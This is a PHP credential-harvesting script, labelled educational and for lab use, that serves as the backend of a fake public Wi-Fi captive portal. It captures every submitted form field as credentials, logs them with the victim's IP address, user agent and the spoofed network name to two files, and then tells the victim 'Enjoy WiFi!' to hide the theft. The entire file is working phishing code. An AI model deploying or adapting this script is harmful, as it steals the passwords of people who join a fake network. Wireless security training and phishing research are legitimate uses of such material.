<?php
// SpyX Educational Credential Capture Script
// FOR LAB USE ONLY

$logFile = __DIR__ . '/logs/credentials.log';
$timestamp = date('Y-m-d H:i:s');
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$platform = $_POST['platform'] ?? 'Unknown';
$ssid = $_POST['ssid'] ?? 'Free_Public_WiFi'; // Get SSID if passed

// Capture credentials
$credentials = [];
foreach ($_POST as $key => $value) {
    if ($key != 'platform' && $key != 'ssid') {
        $credentials[$key] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }
}

// Format log entry
$logEntry = sprintf(
    "[%s] Platform: %s | SSID: %s | IP: %s | UA: %s\n",
    $timestamp,
    $platform,
    $ssid,
    $clientIP,
    $userAgent
);

foreach ($credentials as $field => $value) {
    $logEntry .= sprintf("  %s: %s\n", $field, $value);
}
$logEntry .= str_repeat("-", 80) . "\n";

// Write to log file
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Also save to a separate file for easy viewing
$simpleLog = __DIR__ . '/logs/creds_simple.txt';
$simpleEntry = sprintf("[%s] %s | %s | %s\n", $timestamp, $platform, $ssid, json_encode($credentials));
file_put_contents($simpleLog, $simpleEntry, FILE_APPEND);

// Create a success message (for AJAX requests)
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    // AJAX request - return JSON
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'message' => 'Enjoy WiFi!',
        'redirect' => '/success.html?ssid=' . urlencode($ssid)
    ]);
} else {
    // Regular form submission - redirect to success page
    header('Location: /success.html?ssid=' . urlencode($ssid));
    exit();
}
?>